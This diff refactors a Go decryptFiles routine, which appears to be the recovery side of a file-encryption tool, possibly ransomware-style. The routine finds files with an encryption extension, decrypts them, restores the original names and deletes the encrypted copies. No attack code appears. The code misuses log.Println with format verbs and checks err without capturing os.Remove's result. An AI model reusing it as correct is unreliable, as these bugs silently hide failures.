@@ -31,7 +31,8 @@ func decryptFiles(key string) {
 			ext := filepath.Ext(path)
 			if ext == EncryptionExtension {
 				// Matching Files encrypted
-				MatchedFiles = append(MatchedFiles, path)
+				file := File{f, ext[1:], path}
+				MatchedFiles = append(MatchedFiles, file)
 				log.Println("Matched:", path)
 			}
 			return nil
@@ -39,13 +40,13 @@ func decryptFiles(key string) {
 	}
 
 	// Loop over the matched files
-	for _, path := range MatchedFiles {
-		log.Printf("Decrypting %s...\n", path)
+	for _, file := range MatchedFiles {
+		log.Printf("Decrypting %s...\n", file.Path)
 
 		// Read the file content
-		ciphertext, err := ioutil.ReadFile(path)
+		ciphertext, err := ioutil.ReadFile(file.Path)
 		if err != nil {
-			log.Println("Error opening %s\n", path)
+			log.Println("Error opening %s\n", file.Path)
 			continue
 		}
 
@@ -58,7 +59,7 @@ func decryptFiles(key string) {
 		}
 
 		// Write a new file with the decrypted content
-		err = ioutil.WriteFile(path[0:len(path)-len(filepath.Ext(path))], text, 0600)
+		err = ioutil.WriteFile(file.Path[0:len(file.Path)-len(filepath.Ext(file.Path))], text, 0600)
 		if err != nil {
 			// In case of error, continue to the next file
 			log.Println(err)
@@ -66,7 +67,7 @@ func decryptFiles(key string) {
 		}
 
 		// Remove the encrypted file
-		os.Remove(path)
+		os.Remove(file.Path)
 		if err != nil {
 			log.Println(err)
 		}
